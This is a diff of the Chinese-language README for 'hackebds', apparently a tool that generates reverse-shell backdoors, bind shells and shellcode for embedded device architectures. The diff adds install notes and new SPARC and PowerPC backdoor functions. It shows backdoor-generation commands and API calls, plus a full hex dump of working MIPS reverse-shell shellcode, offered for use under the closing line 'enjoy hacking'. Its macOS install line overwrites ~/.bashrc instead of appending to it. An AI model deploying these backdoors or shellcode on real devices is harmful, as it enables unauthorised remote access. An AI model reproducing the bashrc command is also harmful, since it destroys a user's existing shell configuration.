@@ -28,15 +28,25 @@
 
 
 ### 安装
-安装模块
-**pip install hackebds**
+安装模块，如果需要使用命令行工具请使用sudo安装
 
 ```
-pip install -U hackebds
+sudo pip(3) install -U hackebds
 ```
+如果想在macos下使用此工具不需要使用sudo，但由于MAC的SIP保护，需要将安装python版本的bin目录写入到bashrc(或者其他shell)环境变量下，然后source ~/.bashrc
+
+```
+echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'> ~/.bashrc
+```
+
+![image-20221125095653018](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png)
+
+![image-20221121142622451](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png)
+
 ### 安装问题
-出现python如下图问题请安装对应的binutils环境
-![image-20221107231221043](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221107231221043.png)
+
+出现python如下图问题请安装对应的binutils环境，在github的readme中有mac的下载方法，debian使用apt安装即可
+
 #### 第一步
 
 如果出现如下的错误
@@ -45,15 +55,19 @@ pip install -U hackebds
 
 请使用如下命令解决
 ```
-apt search binutils | grep arm(这里的arm可以更换需要的对应架构)
-apt install binutils-arm-linux-gnueabi/hirsute
+ubuntu（debian）
+	apt search binutils | grep arm(这里的arm可以更换需要的对应架构)
+	apt install binutils-arm-linux-gnueabi/hirsute
+ MacOS:
+ 	 https://github.com/Gallopsled/pwntools-binutils
+ 	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
 ```
 ### 怎么使用
 这里的ip地址与端口都是shell弹回的地址与port，导入此模块后pwn模块也会直接导入，无需再次导入
 #### 1. 生成对应各种架构的后门程序，纯shellcode封装，回连shell成功概率大
 32为程序bind_shell中密码最多4个字符，64位程序最多8个字符
 使用命令行生成后门文件名、shell代码、binshell等
- ![image-20221107231221043](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221107231221043.png)
+ ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
 
    ```
    hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode -passwd 1231
@@ -84,6 +98,7 @@ apt install binutils-arm-linux-gnueabi/hirsute
 >>> mips64el_backdoor(reverse_ip,reverse_port)
 >>> x86el_backdoor(reverse_ip,reverse_port)
 >>> x64el_backdoor(reverse_ip, reverse_port)
+>>> sparc_backdoor(reverse_ip, reverse_port)#big endian
 >>> powerpc_backdoor(reverse_ip, reverse_port)
 >>> powerpcle_backdoor(reverse_ip, reverse_port)
 >>> powerpc64_backdoor(reverse_ip, reverse_port)
@@ -94,6 +109,8 @@ apt install binutils-arm-linux-gnueabi/hirsute
 >>> aarch64_ bind_ shell(listen_port, passwd)
 >>> mips_bind_shell(listen_port, passwd)
 >>> mipsel_bind_shell(listen_port, passwd)
+>>> sparc_bind_shell(listen_port, passwd)
+>>> powerpc_bind_shell(listen_port, passwd)
 ```
 列如:
 ```
@@ -138,24 +155,44 @@ mipsel_backdoor is ok in current path ./
 [+] No NULL byte shellcode for hex(len is 264):
 \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
 ```
+## chips and architectures
+
+Tests can leverage chips and architectures
+
+Mips:
+MIPS 74kc V4.12 big endian,
+MIPS 24kc V5.0  little endian,
+Ingenic Xburst V0.0  FPU V0.0  little endian
+
+Armv7:
+Allwinner(全志)V3s
+
+Armv8:
+Qualcomm Snapdragon 660
+
+Powerpc, sparc: qemu
+
 ## 更新 
-> 	2022.4.29 在hackebds-0.0.5中加入了对aarch64无空字节reverse_shellcode的支持
->
-> 	2022.5.1  更新在引入模块后可以直接调用，减少代码量,更改对python3的支持
-> 	
-> 	2022.5.5  0.0.8版本解决了mips_reverse_sl与mipsel_reverse_sl反弹不了shell的bug加入了mips64大小端的后门与reverse_shell功能
-> 	
-> 	2022.5.21 0.0.9版本更改了armelv5后门生成的方式，加入了riscv-v64的后门指定生成
-> 	
-> 	2022.6.27 0.1.0 加入了安卓手机后门的生成
-> 	
-> 	2022.10.26 0.1.5修复了一些问题，并添加了一些bindshell指定端口密码的自动生成功能
-> 	
-> 	2022.11.2 0.2.0 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速
-> 	
-> 	2022.11.2 0.20 删除了shellcode的生成睡眠时间，并添加了mips_bind_Shell，与x86和x64小端Shell_Backdoor相反，这些mips预计会被mips_biind_Shelll中断，这解决了mips中bindshell中密码逻辑处理的错误问题
->
-> 	2022.11.8 0.2.2 完善了后门，shellcode，bin_shell的生成修复了一些小错误，增加了学习模块指定型号即可生成对应内容。
+
+> 		2022.4.29 在hackebds-0.0.5中加入了对aarch64无空字节reverse_shellcode的支持
+> 		
+> 		2022.5.1  更新在引入模块后可以直接调用，减少代码量,更改对python3的支持
+> 		
+> 		2022.5.5  0.0.8版本解决了mips_reverse_sl与mipsel_reverse_sl反弹不了shell的bug加入了mips64大小端的后门与reverse_shell功能
+> 		
+> 		2022.5.21 0.0.9版本更改了armelv5后门生成的方式，加入了riscv-v64的后门指定生成
+> 		
+> 		2022.6.27 0.1.0 加入了安卓手机后门的生成
+> 		
+> 		2022.10.26 0.1.5修复了一些问题，并添加了一些bindshell指定端口密码的自动生成功能
+> 		
+> 		2022.11.2 0.2.0 支持命令行生成后门和外壳代码，特点是轻便、小巧、高效、快速
+> 		
+> 		2022.11.2 0.20 删除了shellcode的生成睡眠时间，并添加了mips_bind_Shell，与x86和x64小端Shell_Backdoor相反，这些mips预计会被mips_biind_Shelll中断，这解决了mips中bindshell中密码逻辑处理的错误问题
+> 		
+> 		2022.11.8 0.2.2 完善了后门，shellcode，bin_shell的生成修复了一些小错误，增加了学习模块指定型号即可生成对应内容。
+> 		
+> 		2022.11.6 0.2.8 加入了sparc_bind_shell与powerpc_bind_shell文件生成功能，修复了一些bug
 >
 
-## ​:beer:​ 享受hacking
+## :beer: 享受hacking
